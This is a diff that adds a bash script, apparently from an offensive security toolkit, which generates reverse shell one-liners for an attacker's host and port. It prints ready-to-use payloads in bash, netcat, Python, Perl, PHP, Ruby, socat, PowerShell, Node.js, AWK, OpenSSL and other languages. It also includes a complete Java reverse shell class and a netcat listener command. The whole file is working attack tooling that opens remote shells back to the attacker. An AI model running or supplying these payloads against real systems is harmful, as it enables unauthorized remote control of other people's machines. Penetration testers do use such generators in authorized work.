@@ -1,0 +1,236 @@
+#!/usr/bin/env bash
+# blackarch:summary=Generate a reverse shell one-liner for a given LHOST/LPORT
+# blackarch:args=<LHOST> <LPORT> [type]
+# blackarch:examples=blackarch attacker generate reverse_shell 10.0.0.1 4444 | blackarch attacker generate reverse_shell 10.0.0.1 4444 bash
+
+# Reverse Shell Generator Script
+# Usage: ./reverse_shell_generator.sh <LHOST> <LPORT> [type]
+
+# Color codes for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Check arguments
+if [ $# -lt 2 ]; then
+    echo -e "${RED}Usage: $0 <LHOST> <LPORT> [type]${NC}"
+    echo -e "${YELLOW}Types available:${NC}"
+    echo "  bash, nc, nc_e, python, python3, perl, php, ruby,"
+    echo "  socat, powershell, pwsh, java, node, groovy, lua,"
+    echo "  awk, telnet, openssl, gawk, zsh, fish, xterm"
+    echo -e "${YELLOW}Example: $0 192.168.1.100 4444 bash${NC}"
+fi
+
+TUN="$(ip -4 addr show tun0 | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+')"
+LHOST="${1:-$TUN}"
+LPORT="${2:-443}"
+TYPE="${3:-all}"
+
+test -z "$LHOST" && exit 1
+
+# Function to print shell commands
+print_shell() {
+    local name="$1"
+    local cmd="$2"
+    echo -e "${GREEN}=== $name ===${NC}"
+    echo -e "${BLUE}$cmd${NC}"
+    echo ""
+}
+
+# Generate all reverse shells
+generate_all() {
+    echo -e "${GREEN}========================================${NC}"
+    echo -e "${GREEN}Reverse Shells for $LHOST:$LPORT${NC}"
+    echo -e "${GREEN}========================================${NC}"
+    echo ""
+    
+    # Bash
+    print_shell "Bash" "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+    
+    # Bash (alternative)
+    print_shell "Bash (alternative)" "0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196"
+    
+    # Netcat
+    print_shell "Netcat" "nc -e /bin/sh $LHOST $LPORT"
+    print_shell "Netcat (alternative)" "nc -c /bin/sh $LHOST $LPORT"
+    
+    # Netcat without -e flag
+    print_shell "Netcat (no -e)" "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
+    
+    # Python
+    print_shell "Python" "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    
+    # Python3
+    print_shell "Python3" "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    
+    # Perl
+    print_shell "Perl" "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    
+    # PHP
+    print_shell "PHP" "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    
+    # Ruby
+    print_shell "Ruby" "ruby -rsocket -e 'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    
+    # Socat
+    print_shell "Socat" "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"
+    
+    # PowerShell (Linux)
+    print_shell "PowerShell" "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}\$client.Close()\""
+    
+    # PowerShell (Windows .NET)
+    print_shell "PowerShell (Windows)" "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}\$client.Close()\""
+    
+    # Node.js
+    print_shell "Node.js" "node -e 'require(\"net\").connect($LPORT,\"$LHOST\",function(){var cp=require(\"child_process\");var sh=cp.spawn(\"/bin/sh\",[]);this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});'"
+    
+    # Java
+    print_shell "Java" "java -cp . Shell"
+    
+    # AWK
+    print_shell "AWK" "awk 'BEGIN {s = \"/inet/tcp/0/$LHOST/$LPORT\"; while(42) { do{ printf \"shell> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+    
+    # Telnet
+    print_shell "Telnet" "telnet $LHOST $LPORT | /bin/bash | telnet $LHOST $LPORT"
+    
+    # Gawk
+    print_shell "GAWK" "gawk 'BEGIN {print \"\" | \"/bin/telnet $LHOST $LPORT\"}'"
+    
+    # OpenSSL
+    print_shell "OpenSSL" "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $LHOST:$LPORT > /tmp/s; rm /tmp/s"
+    
+    # Zsh
+    print_shell "Zsh" "zmodload zsh/net/tcp && ztcp $LHOST $LPORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY"
+    
+    # Fish
+    print_shell "Fish" "fish -c \"exec /bin/sh -i <&3 >&3 2>&3\" 3<>/dev/tcp/$LHOST/$LPORT"
+}
+
+# Generate specific type
+generate_specific() {
+    case "$TYPE" in
+        bash)
+            print_shell "Bash" "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+            ;;
+        bash_alt)
+            print_shell "Bash (alternative)" "0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196"
+            ;;
+        nc)
+            print_shell "Netcat" "nc -e /bin/sh $LHOST $LPORT"
+            ;;
+        nc_alt)
+            print_shell "Netcat (no -e)" "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
+            ;;
+        python)
+            print_shell "Python" "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+            ;;
+        python3)
+            print_shell "Python3" "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+            ;;
+        perl)
+            print_shell "Perl" "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+            ;;
+        php)
+            print_shell "PHP" "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            ;;
+        ruby)
+            print_shell "Ruby" "ruby -rsocket -e 'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+            ;;
+        socat)
+            print_shell "Socat" "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"
+            ;;
+        powershell)
+            print_shell "PowerShell" "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}\$client.Close()\""
+            ;;
+        pwsh)
+            print_shell "PowerShell Core" "pwsh -c \"\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}\$client.Close()\""
+            ;;
+        node)
+            print_shell "Node.js" "node -e 'require(\"net\").connect($LPORT,\"$LHOST\",function(){var cp=require(\"child_process\");var sh=cp.spawn(\"/bin/sh\",[]);this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});'"
+            ;;
+        java)
+            echo -e "${YELLOW}Java requires a compiled class file. Here's the Java code:${NC}"
+            cat << 'EOF'
+// Shell.java
+import java.io.*;
+import java.net.*;
+public class Shell {
+    public static void main(String[] args) throws Exception {
+        String host = "LHOST";
+        int port = LPORT;
+        Socket s = new Socket(host, port);
+        Process p = Runtime.getRuntime().exec("/bin/sh");
+        new Thread(() -> {
+            try {
+                InputStream is = p.getInputStream();
+                OutputStream os = s.getOutputStream();
+                byte[] b = new byte[1024];
+                int len;
+                while ((len = is.read(b)) != -1) {
+                    os.write(b, 0, len);
+                }
+            } catch (Exception e) {}
+        }).start();
+        new Thread(() -> {
+            try {
+                InputStream is = s.getInputStream();
+                OutputStream os = p.getOutputStream();
+                byte[] b = new byte[1024];
+                int len;
+                while ((len = is.read(b)) != -1) {
+                    os.write(b, 0, len);
+                }
+            } catch (Exception e) {}
+        }).start();
+        p.waitFor();
+    }
+}
+EOF
+            echo -e "${YELLOW}Compile with: javac Shell.java${NC}"
+            echo -e "${YELLOW}Replace LHOST and LPORT with your values${NC}"
+            ;;
+        groovy)
+            print_shell "Groovy" "groovy -e \"String host='$LHOST';int port=$LPORT;new Socket(host,port).withStreams { i,o -> Process p='/bin/sh'.execute();Thread.start{while((b=i.read())!=-1)o.write(b)};Thread.start{while((b=p.in.read())!=-1)o.write(b)};p.waitFor()}\""
+            ;;
+        lua)
+            print_shell "Lua" "lua -e \"local s=require('socket');local t=s.tcp();t:connect('$LHOST',$LPORT);while true do local c=t:receive();if c=='exit' then break end;local f=io.popen(c);local b=f:read('*all');t:send(b);end;t:close()\""
+            ;;
+        awk)
+            print_shell "AWK" "awk 'BEGIN {s = \"/inet/tcp/0/$LHOST/$LPORT\"; while(42) { do{ printf \"shell> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+            ;;
+        telnet)
+            print_shell "Telnet" "telnet $LHOST $LPORT | /bin/bash | telnet $LHOST $LPORT"
+            ;;
+        openssl)
+            print_shell "OpenSSL" "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $LHOST:$LPORT > /tmp/s; rm /tmp/s"
+            ;;
+        gawk)
+            print_shell "GAWK" "gawk 'BEGIN {print \"\" | \"/bin/telnet $LHOST $LPORT\"}'"
+            ;;
+        zsh)
+            print_shell "Zsh" "zmodload zsh/net/tcp && ztcp $LHOST $LPORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY"
+            ;;
+        fish)
+            print_shell "Fish" "fish -c \"exec /bin/sh -i <&3 >&3 2>&3\" 3<>/dev/tcp/$LHOST/$LPORT"
+            ;;
+        xterm)
+            print_shell "XTerm" "xterm -display $LHOST:$LPORT"
+            ;;
+        *)
+            echo -e "${RED}Unknown type: $TYPE${NC}"
+            echo -e "${YELLOW}Available types: bash, nc, python, python3, perl, php, ruby, socat, powershell, pwsh, node, java, groovy, lua, awk, telnet, openssl, gawk, zsh, fish, xterm${NC}"
+            exit 1
+            ;;
+    esac
+}
+
+# Main execution
+if [ "$TYPE" = "all" ]; then
+    generate_all
+else
+    generate_specific
+fi
+
+echo -e "${YELLOW}Tip: Set up a listener with: nc -lvnp $LPORT${NC}"
